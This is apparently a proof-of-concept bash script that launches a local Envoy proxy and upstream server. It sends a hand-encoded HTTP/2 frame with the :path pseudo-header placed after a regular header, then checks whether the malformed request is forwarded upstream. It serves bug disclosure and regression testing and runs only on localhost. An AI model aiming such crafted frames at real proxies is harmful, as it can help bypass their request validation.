#!/bin/bash
# Usage: poc.sh <path-to-envoy-static> [oghttp2|nghttp2]
# Sends one HTTP/2 request whose :path pseudo-header comes after a regular header
# (x-a: b) and reports whether Envoy forwarded it to the upstream.
# Needs python3. Uses 127.0.0.1 ports 10000 (listener), 18080 (upstream), 19901 (admin).
set -u
ENVOY=$(realpath "$1"); CODEC=${2:-oghttp2}
[ "$CODEC" = oghttp2 ] && FLAG=true || FLAG=false
D=$(mktemp -d); trap 'kill $EP $UP 2>/dev/null; rm -rf "$D"' EXIT

cat > "$D/envoy.yaml" <<EOF
admin: {address: {socket_address: {address: 127.0.0.1, port_value: 19901}}}
layered_runtime:
  layers:
  - name: static
    static_layer: {envoy.reloadable_features.http2_use_oghttp2: $FLAG}
static_resources:
  listeners:
  - address: {socket_address: {address: 127.0.0.1, port_value: 10000}}
    filter_chains:
    - filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          "@type": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager
          stat_prefix: ingress
          codec_type: HTTP2
          route_config:
            virtual_hosts:
            - name: all
              domains: ["*"]
              routes: [{match: {prefix: "/"}, route: {cluster: up}}]
          http_filters:
          - name: envoy.filters.http.router
            typed_config: {"@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router}
  clusters:
  - name: up
    type: STATIC
    load_assignment:
      cluster_name: up
      endpoints: [{lb_endpoints: [{endpoint: {address: {socket_address: {address: 127.0.0.1, port_value: 18080}}}}]}]
EOF

# Upstream: HTTP/1.1 server that logs each request line it receives.
python3 -c '
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def do_GET(self):
        print("UPSTREAM GOT:", self.requestline, flush=True)
        self.send_response(200); self.send_header("content-length", "0"); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(("127.0.0.1", 18080), H).serve_forever()' > "$D/upstream.log" 2>&1 &
UP=$!
"$ENVOY" -c "$D/envoy.yaml" --concurrency 1 --disable-hot-restart -l "${LOG_LEVEL:-warning}" > "$D/envoy.log" 2>&1 &
EP=$!
for _ in $(seq 100); do
  python3 -c 'import socket; socket.create_connection(("127.0.0.1", 10000))' 2>/dev/null && break
  sleep 0.1
done

# Client preface + empty SETTINGS + one HEADERS frame (stream 1, END_STREAM|END_HEADERS).
# HPACK "literal without indexing" fields, in this order:
#   :method GET, :scheme http, :authority example.com, x-a b, :path /
REQ='PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
REQ+='\x00\x00\x00\x04\x00\x00\x00\x00\x00'
REQ+='\x00\x00\x43\x01\x05\x00\x00\x00\x01'
REQ+='\x00\x07:method\x03GET'
REQ+='\x00\x07:scheme\x04http'
REQ+='\x00\x0a:authority\x0bexample.com'
REQ+='\x00\x03x-a\x01b'
REQ+='\x00\x05:path\x01/'
printf "$REQ" > "$D/request.bin"

python3 - "$D/request.bin" <<'PY'
import socket, struct, sys, time
s = socket.create_connection(("127.0.0.1", 10000)); s.settimeout(1)
s.sendall(open(sys.argv[1], "rb").read())
buf = b""; end = time.time() + 2
while time.time() < end:
    try:
        d = s.recv(65536)
        if not d: break
        buf += d
    except socket.timeout:
        break
names = {0: "DATA", 1: "HEADERS", 3: "RST_STREAM", 4: "SETTINGS", 6: "PING", 7: "GOAWAY", 8: "WINDOW_UPDATE"}
while len(buf) >= 9:
    ln = int.from_bytes(buf[:3], "big"); t, fl = buf[3], buf[4]
    sid = struct.unpack(">I", buf[5:9])[0] & 0x7fffffff; p = buf[9:9 + ln]; buf = buf[9 + ln:]
    extra = ""
    if t == 3: extra = " error_code=%d" % struct.unpack(">I", p[:4])[0]
    if t == 7: extra = " error_code=%d" % struct.unpack(">I", p[4:8])[0]
    if t == 1 and sid == 1: extra = " (response headers)"
    print("FRAME %s stream=%d%s" % (names.get(t, t), sid, extra))
PY
sleep 0.3
cat "$D/upstream.log"
# LOG_LEVEL=debug: show Envoy's codec/stream lines for this request.
[ "${LOG_LEVEL:-warning}" = debug ] && grep -E "\[http2\]|\[http\]|\[router\]" "$D/envoy.log" | cut -c1-220 | tail -n 20
if grep -q "UPSTREAM GOT" "$D/upstream.log"; then
  echo "RESULT ($CODEC): malformed request was forwarded upstream"; exit 1
else
  echo "RESULT ($CODEC): request was not forwarded"; exit 0
fi
